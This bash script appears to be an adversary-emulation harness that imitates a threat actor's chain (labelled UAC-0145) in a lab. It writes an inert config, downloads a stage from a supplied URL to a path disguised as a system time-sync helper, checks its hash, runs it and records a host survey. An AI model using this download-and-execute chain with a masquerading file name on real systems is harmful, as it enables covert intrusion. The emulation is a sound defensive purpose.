#!/usr/bin/env bash
set -euo pipefail
work_dir="$1"
stage_url="$2"
proxy_url="${3:-}"
printf '[Interface]\n# UAC-0145 inert lab configuration\nSymmetricKey = LAB-INERT\n' > "$work_dir/sopraconfLinux.conf"
mkdir -p "$work_dir/usr/libexec"
stage_path="$work_dir/usr/libexec/timesyncd-check"
proxy_args=()
if [ -n "$proxy_url" ]; then proxy_args=(--proxy "$proxy_url"); fi
curl --fail --silent --show-error --retry 3 --retry-delay 2 --connect-timeout 10 --max-time 30 \
  --noproxy '' "${proxy_args[@]}" "$stage_url" -o "$stage_path"
stage_hash='664c1cda9200eaa3d7b8affb71e5ea77e063cfc86b68f7d44224a583c2a0871a'
[ "$(sha256sum "$stage_path" | cut -d' ' -f1)" = "$stage_hash" ]
chmod 700 "$stage_path"
"$stage_path" "$work_dir"
[ -f "$work_dir/stage-complete" ]
[ -s "$work_dir/survey.json" ]
printf '{"config":true,"tunnel":%s,"download":true,"executed":true,"stageSha256":"%s","observedAt":"%s","survey":%s}' \
  "$([ -n "$proxy_url" ] && printf true || printf false)" "$stage_hash" "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
  "$(cat "$work_dir/survey.json")" > "$work_dir/result.json"
